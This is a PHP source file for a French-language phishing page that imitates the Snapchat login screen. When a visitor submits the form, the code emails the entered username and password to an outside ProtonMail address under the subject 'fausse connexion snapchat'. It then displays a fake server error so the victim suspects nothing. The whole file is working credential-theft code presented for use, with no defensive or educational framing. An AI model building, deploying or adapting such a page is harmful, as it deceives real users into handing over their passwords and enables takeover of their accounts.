<?php
if(isset($_POST['mailform']))
{
	if(!empty($_POST['nom']) AND !empty($_POST['mail']) )
	{
		$header="MIME-Version: 1.0\r\n";
		$header.='From:"PrimFX.com"<support@primfx.com>'."\n";
		$header.='Content-Type:text/html; charset="uft-8"'."\n";
		$header.='Content-Transfer-Encoding: 8bit';

		$message='
		<html>
			<body>
				<div align="center">
					
					<br />
					<u>Nom de\'utilisateur</u>'.$_POST['nom'].'<br />
					<u>mots de passe</u>'.$_POST['mail'].'<br />
					<br />
					
					<br />
					
				</div>
			</body>
		</html>
		';

		mail("virusdog@protonmail.ch", "fausse connexion snapchat", $message, $header);
		$msg="Une erreur est survenue sur le serveur";
	}
	else
	{
		$msg="Tous les champs doivent être complétés !";
	}
}

?>
<html>
	<head>
		<title>Connexion &bull; Snapchat</title>
		<meta charset="utf-8" />
		<link rel="stylesheet" type="text/css" href="css.css">
	</head>
	<body>
		<h2>Se connecter à Snapchat</h2>
		<form method="POST" action="">
			<img src="logo.png" width="70">
			<p>Nom d'utilisateur ou adresse e-mail</p>
			<input type="text" name="nom" value="<?php if(isset($_POST['nom'])) { echo $_POST['nom']; } ?>" /><br /><br />
			<p>Mot de passe</p>
			<input type="email" name="mail" value="<?php if(isset($_POST['mail'])) { echo $_POST['mail']; } ?>" /><br /><br />
			
			<input type="submit" value="Connexion" name="mailform"/>

		</form>
		<?php

		if(isset($msg))
		{
			echo $msg;
		}
		?>
	</body>
</html>
